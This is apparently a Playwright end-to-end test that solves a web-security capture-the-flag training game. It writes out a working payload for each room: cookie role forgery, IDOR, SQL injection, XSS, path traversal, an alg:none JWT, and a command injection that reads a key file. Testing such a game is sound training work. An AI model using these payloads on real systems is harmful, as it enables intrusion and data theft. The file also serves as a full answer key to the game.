import { expect, test, type Page } from "@playwright/test";

const FLAG = /BREACH\{[^}]+}/;

function responseBody(page: Page) {
  return page.locator(".kit__code:visible").first();
}

async function openTab(page: Page, name: string) {
  await page.getByRole("button", { name, exact: true }).click();
}

async function browse(page: Page, path: string) {
  await openTab(page, "Browser");
  await page.getByRole("textbox", { name: "Path" }).fill(path);
  await page.getByRole("button", { name: "Send" }).click();
}

async function repeat(page: Page, method: string, path: string, headers: string, body: string) {
  await openTab(page, "Repeater");
  await page.getByLabel("Method").selectOption(method);
  await page.getByRole("textbox", { name: "Path" }).fill(path);
  await page.getByRole("textbox", { name: "Headers, one per line" }).fill(headers);
  await page.getByRole("textbox", { name: "Body" }).fill(body);
  await page.getByRole("button", { name: "Send" }).click();
}

async function fileFlag(page: Page, flag: string) {
  await page.getByRole("textbox", { name: "Flag" }).fill(flag);
  await page.getByRole("button", { name: "File the flag" }).click();
  await expect(page.getByRole("img", { name: "Department cleared" })).toBeVisible();
}

async function fileFlagFromBody(page: Page) {
  await expect(responseBody(page)).toContainText("BREACH{");
  await fileFlag(page, (await responseBody(page).textContent())?.match(FLAG)?.[0] ?? "");
}

async function nextDepartment(page: Page, name: string) {
  await page.getByRole("button", { name: "Proceed to the next department" }).click();
  await expect(page.getByRole("heading", { name, exact: true })).toBeVisible();
}

test("a player escapes through all nine departments in one sitting", async ({ page }) => {
  test.setTimeout(180_000);
  const purchase = "/api/rooms/checkout/purchase";
  const json = "Content-Type: application/json";

  await page.goto("/");
  await page.getByRole("button", { name: "Unwind the string" }).click();
  await page.getByRole("button", { name: "Report to Reception" }).click();

  await browse(page, "/api/rooms/recon/robots.txt");
  await expect(responseBody(page)).toContainText("Disallow");
  const hiddenPath = (await responseBody(page).textContent())?.match(/Disallow:\s*(\S+)/)?.[1] ?? "";
  await browse(page, hiddenPath);
  const debugHeader = page.locator(".response__headers > div:visible", { hasText: "x-kryptelia-debug" }).locator("dd");
  await fileFlag(page, (await debugHeader.textContent()) ?? "");

  await nextDepartment(page, "Internal Shop");
  await repeat(page, "POST", purchase, json, '{"sku":"master-key","price":0}');
  await fileFlagFromBody(page);

  await nextDepartment(page, "Locker Room");
  await browse(page, "/api/rooms/cookiejar/locker");
  await expect(responseBody(page)).toContainText("profile has been issued");
  await openTab(page, "Cookies");
  const cookieValue = page.getByRole("textbox", { name: "Value" });
  const profile = Buffer.from(await cookieValue.inputValue(), "base64").toString();
  await cookieValue.fill(Buffer.from(profile.replace('"role":"guest"', '"role":"admin"')).toString("base64"));
  await browse(page, "/api/rooms/cookiejar/locker");
  await fileFlagFromBody(page);

  await nextDepartment(page, "Archive");
  await browse(page, "/api/rooms/idor/documents/1001");
  await fileFlagFromBody(page);

  await nextDepartment(page, "Directory");
  await browse(page, "/api/rooms/sqli/employees?search=' UNION SELECT id, label, secret FROM vault -- ");
  await fileFlagFromBody(page);

  await nextDepartment(page, "Mailbox");
  await page.getByRole("textbox", { name: "Search mail" }).fill("<img src=x onerror=alert(1)>");
  await page.getByRole("button", { name: "Search", exact: true }).click();
  const scriptProof = page.locator(".mailbox__proof .kit__code");
  await expect(scriptProof).toContainText("BREACH{");
  await fileFlag(page, (await scriptProof.textContent()) ?? "");

  await nextDepartment(page, "Backups");
  await browse(page, "/api/rooms/traversal/download?file=../../../vault/backup.key");
  await fileFlagFromBody(page);

  await nextDepartment(page, "Access Control");
  const unsignedHeader = Buffer.from('{"alg":"none"}').toString("base64url");
  const directorClaims = Buffer.from('{"role":"director"}').toString("base64url");
  await repeat(page, "GET", "/api/rooms/jwt/door", `Authorization: Bearer ${unsignedHeader}.${directorClaims}.`, "");
  await fileFlagFromBody(page);

  await nextDepartment(page, "Diagnostics");
  await repeat(page, "POST", "/api/rooms/cmdinjection/ping", json, '{"host":"127.0.0.1; cat /vault/escape.key"}');
  await fileFlagFromBody(page);

  await page.getByRole("button", { name: "Leave the building" }).click();
  await expect(page.getByRole("heading", { name: "You are out" })).toBeVisible();
  await expect(page.getByText("Chief Exit Officer")).toBeVisible();
});
